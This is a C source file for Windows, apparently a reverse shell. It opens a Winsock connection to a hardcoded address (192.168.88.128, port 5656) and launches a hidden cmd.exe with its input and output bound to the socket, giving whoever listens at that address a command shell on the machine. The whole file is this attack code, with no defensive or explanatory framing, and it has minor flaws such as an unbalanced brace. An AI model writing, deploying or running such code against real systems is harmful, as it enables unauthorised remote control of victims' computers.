#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <processthreadsapi.h>
#include <ws2tcpip.h>
#include <ws2ipdef.h>
#include <stdio.h>
#include <string.h>
#pragma comment(lib, "ws2_32.lib") // If u compilet for Linux no use

SOCKET shell;
sockaddr_in shell_addr;
WSADATA wsa;

char ip_addr[]="192.168.88.128";
int port = 5656;
int conn;

STARTUPINFO si;
PROCESS_INFORMATION pi;

int main() {
	WSAStartup(MAKEWORD(2,2), &wsa);
	shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

  shell_addr.sin_family = AF_INET;
	shell_addr.sin_port = htons(port);
	shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

  SOCKADDR* pShellAddr = (SOCKADDR*)&shell_addr;
	
	conn = WSAConnect(shell, pShellAddr, sizeof(shell_addr), NULL, NULL, NULL);
	
	if(conn == SOCKET_ERROR) {
		printf("[!] Socket connection error. Please close and try restart.");
		exit(0);
	}
	else {
	  char space[4096];
	  while (true) {
	    int receivedBytes = recv(shell, space, sizeof(space), 0);
	    SecureZeroMemory(&si, sizeof(si));
      si.cb = sizeof(si);
		  si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		  si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;
		  si.wShowWindow = SW_HIDE;

		  LPSTR processName = (LPSTR)"cmd.exe";
		  CreateProcess(NULL, processName, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

		  WaitForSingleObject(pi.hProcess, INFINITE);
		  CloseHandle(pi.hThread);
		  CloseHandle(pi.hProcess);
		
		return 0;
	}
}
